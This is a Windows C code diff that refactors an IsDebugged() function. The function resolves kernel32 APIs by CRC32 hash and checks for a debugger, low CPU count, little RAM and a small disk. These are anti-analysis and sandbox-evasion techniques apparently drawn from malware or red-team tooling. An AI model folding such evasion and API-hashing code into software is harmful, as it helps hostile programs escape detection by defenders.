@@ -38,9 +38,11 @@ BOOL IsDebugged()
     mem_cpy(d_string,s_string,12);
 
     HANDLE p_kernel32 = GetModuleHandle(d_string);
-
-    IsDebuggerPresent_t p_IsDebuggerPresent= (IsDebuggerPresent_t) get_proc_address_by_hash(p_kernel32, IsDebuggerPresent_CRC32B);
-    CheckRemoteDebuggerPresent_t p_CheckRemoteDebuggerPresent= (CheckRemoteDebuggerPresent_t) get_proc_address_by_hash(p_kernel32, CheckRemoteDebuggerPresent_CRC32B);
+    
+    IsDebuggerPresent_t p_IsDebuggerPresent= (IsDebuggerPresent_t) GetProcAddressByHash(p_kernel32,
+                                                                                        IsDebuggerPresent_CRC32B);
+    CheckRemoteDebuggerPresent_t p_CheckRemoteDebuggerPresent= (CheckRemoteDebuggerPresent_t) GetProcAddressByHash(
+            p_kernel32, CheckRemoteDebuggerPresent_CRC32B);
     p_CheckRemoteDebuggerPresent(NtCurrentProcess, &outBool);
 
     if (p_IsDebuggerPresent() || outBool) {
@@ -49,7 +51,7 @@ BOOL IsDebugged()
 
     // check CPU
     SYSTEM_INFO systemInfo;
-    GetSystemInfo_t p_GetSystemInfo= (GetSystemInfo_t) get_proc_address_by_hash(p_kernel32, GetSystemInfo_CRC32B);
+    GetSystemInfo_t p_GetSystemInfo= (GetSystemInfo_t) GetProcAddressByHash(p_kernel32, GetSystemInfo_CRC32B);
     p_GetSystemInfo(&systemInfo);
     DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
     if (numberOfProcessors < 4) return TRUE;
@@ -57,17 +59,18 @@ BOOL IsDebugged()
     // check RAM
     MEMORYSTATUSEX memoryStatus;
     memoryStatus.dwLength = sizeof(memoryStatus);
-    GlobalMemoryStatusEx_t p_GlobalMemoryStatusEx = (GlobalMemoryStatusEx_t) get_proc_address_by_hash(p_kernel32, GlobalMemoryStatusEx_CRC32B);
+    GlobalMemoryStatusEx_t p_GlobalMemoryStatusEx = (GlobalMemoryStatusEx_t) GetProcAddressByHash(p_kernel32,
+                                                                                                  GlobalMemoryStatusEx_CRC32B);
     p_GlobalMemoryStatusEx(&memoryStatus);
     DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;
     if (RAMMB < 4096) return TRUE;
 
     // check HDD
-    CreateFileW_t p_CreateFileW= (CreateFileW_t) get_proc_address_by_hash(p_kernel32, CreateFileW_CRC32B);
+    CreateFileW_t p_CreateFileW= (CreateFileW_t) GetProcAddressByHash(p_kernel32, CreateFileW_CRC32B);
     HANDLE hDevice = p_CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
     DISK_GEOMETRY pDiskGeometry;
     DWORD bytesReturned;
-    DeviceIoControl_t p_DeviceIoControl = (CreateFileW_t) get_proc_address_by_hash(p_kernel32, DeviceIoControl_CRC32B);
+    DeviceIoControl_t p_DeviceIoControl = (CreateFileW_t) GetProcAddressByHash(p_kernel32, DeviceIoControl_CRC32B);
     p_DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL);
     DWORD diskSizeGB;
     diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
